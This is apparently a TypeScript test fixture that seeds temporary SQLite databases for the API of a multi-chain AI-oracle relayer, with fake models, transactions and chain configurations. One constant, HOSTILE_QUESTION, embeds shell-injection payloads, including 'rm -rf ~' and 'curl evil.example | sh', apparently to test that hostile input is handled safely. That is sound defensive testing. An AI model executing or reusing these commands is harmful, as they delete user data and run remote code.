import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Address } from "viem";
import { openDatabase } from "../../src/db.js";
import type { ApiConfig, ApiEvmSource, ApiNearSource, ApiSource } from "../../src/api/config.js";
import type { ModelInfo } from "../../src/types.js";
import { AIORACLE, ARBITRUM_CHAIN_ID, askedEvent, CHAIN_ID, ManualClock, nearRequest, ORACLE_ADDRESS } from "../fakes.js";

export const MODELS: readonly ModelInfo[] = [
  { model: "alpha/A", provider: "near-ai", scheme: "nearai-v1", publicKey: "aa".repeat(32) },
  { model: "beta/B", provider: "near-ai", scheme: "nearai-v1", publicKey: "bb".repeat(32) },
  { model: "gamma/C", provider: "near-ai", scheme: "nearai-v1", publicKey: "cc".repeat(32) },
];

export const BASE_TX = `0x${"ab".repeat(32)}`;
export const NEAR_TX = "3g5AbfqTwQuv5KuDgaGD8onh1k6dksKxcLKbQ4C8M3Jv";
export const HOSTILE_QUESTION = "Was it paid? $(rm -rf ~) `id` '; curl evil.example | sh; echo '";
export const T0 = Date.UTC(2026, 10, 8, 12, 0, 0);

export const ARB_AIORACLE: Address = "0x1111111111111111111111111111111111111111";
export const NEAR_FULFILL_TX = "9g5AbfqTwQuv5KuDgaGD8onh1k6dksKxcLKbQ4C8M3Jv";

export interface Fixture {
  readonly path: string;
  readonly arbitrumPath: string;
  readonly nearPath: string;
  readonly clock: ManualClock;
  cleanup(): void;
}

function answer(model: string, vote: string, requestId: number) {
  return {
    requestBody: JSON.stringify({ model, messages: [{ role: "user", content: `request #${requestId}` }] }),
    reply: { chatId: `chat-${requestId}-${model}`, responseBody: JSON.stringify({ choices: [{ message: { content: vote } }] }), latencyMs: 900 },
    sig: { text: `${model}:req:${requestId}`, signatureHex: "ee".repeat(64), signingAddress: "00" },
  };
}

function signAll(repo: ReturnType<typeof openDatabase>, id: number, vote: string): void {
  for (const m of MODELS) {
    const a = answer(m.model, vote, id);
    repo.beginModelAttempt(id, m.model, m.provider, a.requestBody);
    repo.saveModelCompletion(id, m.model, a.reply);
    repo.saveModelSignature(id, m.model, a.sig);
  }
  repo.updateRequest(id, { answer: vote, votesJson: JSON.stringify(MODELS.map((m) => ({ model: m.model, answer: vote }))) });
}

function buildArbitrum(path: string): void {
  const clock = new ManualClock();
  clock.t = T0 + 30_000;
  const repo = openDatabase(path, clock);
  repo.recordAsked([askedEvent(1n, "Arbitrum one?")], 900n, [], "arbitrum");
  repo.close();
}

/**
 * NEAR request 1 is created at T0, the same millisecond as Base requests 1 to 4, so paging
 * across that millisecond is covered; NEAR request 2 is the newest record of all sources.
 */
function buildNear(path: string): void {
  const clock = new ManualClock();
  clock.t = T0;
  const repo = openDatabase(path, clock);
  repo.recordNearRequests([nearRequest(1, "Is NEAR fast?")], 1);
  signAll(repo, 1, "YES");
  repo.saveNearTx({ requestId: 1, txHash: NEAR_FULFILL_TX, nonce: 0, maxFee: "0", maxPriorityFee: "0", signedTxBase64: "AAAA" });
  repo.markNearResult(NEAR_FULFILL_TX, true, null, JSON.stringify({ ok: true, chain: "near:testnet", request_id: 1, answer: "YES" }));
  clock.t = T0 + 20_000;
  repo.updateRequest(1, { status: "confirmed" });
  clock.t = T0 + 90_000;
  repo.recordNearRequests([nearRequest(2, "Second?")], 2);
  repo.addModelCalls("2026-11-08", 3);
  repo.close();
}

export function buildFixture(): Fixture {
  const dir = mkdtempSync(join(tmpdir(), "psephex-api-"));
  const path = join(dir, "relayer.sqlite");
  const arbitrumPath = join(dir, "relayer-arbitrum.sqlite");
  const nearPath = join(dir, "relayer-near.sqlite");
  buildArbitrum(arbitrumPath);
  buildNear(nearPath);
  const clock = new ManualClock();
  clock.t = T0;
  const repo = openDatabase(path, clock);
  repo.recordAsked([askedEvent(1n, "Is 7 prime?"), askedEvent(2n, HOSTILE_QUESTION), askedEvent(3n, "Coin flip?"), askedEvent(4n, "x".repeat(400))], 210n);

  for (const m of MODELS) {
    const a = answer(m.model, "YES", 1);
    repo.beginModelAttempt(1, m.model, m.provider, a.requestBody);
    repo.saveModelCompletion(1, m.model, a.reply);
    repo.saveModelSignature(1, m.model, a.sig);
  }
  repo.updateRequest(1, { answer: "YES", votesJson: JSON.stringify(MODELS.map((m) => ({ model: m.model, answer: "YES" }))) });
  repo.saveNearTx({ requestId: 1, txHash: NEAR_TX, nonce: 3, maxFee: "1000", maxPriorityFee: "10", signedTxBase64: "AAAA" });
  repo.markNearResult(NEAR_TX, true, "02f8", JSON.stringify({ ok: true, request_id: 1 }));
  repo.saveBaseTx({ requestId: 1, txHash: BASE_TX, signedTx: "0x02f8" });
  repo.markBaseReceipt(BASE_TX, "success", 79_561n, JSON.stringify([{ event: "Fulfilled", args: { id: "1", answer: 1 } }]));
  clock.t = T0 + 42_000;
  repo.updateRequest(1, { status: "confirmed" });

  const first = MODELS[0] as ModelInfo;
  const a2 = answer(first.model, "NO", 2);
  repo.beginModelAttempt(2, first.model, first.provider, a2.requestBody);
  repo.saveModelCompletion(2, first.model, a2.reply);
  repo.updateRequest(2, { status: "answering" });

  clock.t = T0 + 60_000;
  repo.updateRequest(3, { status: "confirmed", answer: "UNKNOWN" });
  repo.updateRequest(4, { status: "rejected", reason: "question is longer than 2000 bytes" });
  repo.addModelCalls("2026-11-08", 7);
  repo.close();
  return { path, arbitrumPath, nearPath, clock, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
}

export function baseSource(dbPath: string): ApiEvmSource {
  return {
    source: "base",
    kind: "evm",
    chain: `eip155:${CHAIN_ID}`,
    name: "Base Sepolia",
    dbPath,
    explorer: "https://sepolia.basescan.org",
    rpcUrl: "https://base.rpc.test/secret-key",
    publicRpcUrl: "https://sepolia.base.org",
    aiOracleAddress: AIORACLE,
    chainId: CHAIN_ID,
    dispute: "0xCa744C595A6C2EE470257D2B873aEd2b1a78E092",
  };
}

export function arbitrumSource(dbPath: string): ApiEvmSource {
  return {
    source: "arbitrum",
    kind: "evm",
    chain: `eip155:${ARBITRUM_CHAIN_ID}`,
    name: "Arbitrum Sepolia",
    dbPath,
    explorer: "https://sepolia.arbiscan.io",
    rpcUrl: "https://arb.rpc.test/secret-key",
    publicRpcUrl: "https://sepolia-rollup.arbitrum.io/rpc",
    aiOracleAddress: ARB_AIORACLE,
    chainId: ARBITRUM_CHAIN_ID,
    dispute: null,
  };
}

export function nearSource(dbPath: string): ApiNearSource {
  return { source: "near", kind: "near", chain: "near:testnet", name: "NEAR testnet", dbPath, explorer: "https://testnet.nearblocks.io", dispute: "dispute.psephex.testnet" };
}

export function allSources(fx: Fixture): ApiSource[] {
  return [baseSource(fx.path), arbitrumSource(fx.arbitrumPath), nearSource(fx.nearPath)];
}

export function apiConfig(dbPath: string, overrides: Partial<ApiConfig> = {}): ApiConfig {
  return {
    sources: [baseSource(dbPath)],
    host: "127.0.0.1",
    port: 0,
    publicUrl: "https://api.psephex.test",
    corsOrigin: "https://app.psephex.test",
    rateLimitPerMinute: 1000,
    trustProxy: false,
    chainCacheMs: 15_000,
    nearRpcUrl: "https://near.rpc.test/secret-key",
    nearNetwork: "testnet",
    nearAiBaseUrl: "https://cloud-api.near.ai",
    oracleEvmAddress: ORACLE_ADDRESS as Address,
    nearOracleContract: "oracle.psephex.testnet",
    nearRelayerAccount: "relayer.psephex.testnet",
    dailyModelBudget: 300,
    ...overrides,
  };
}
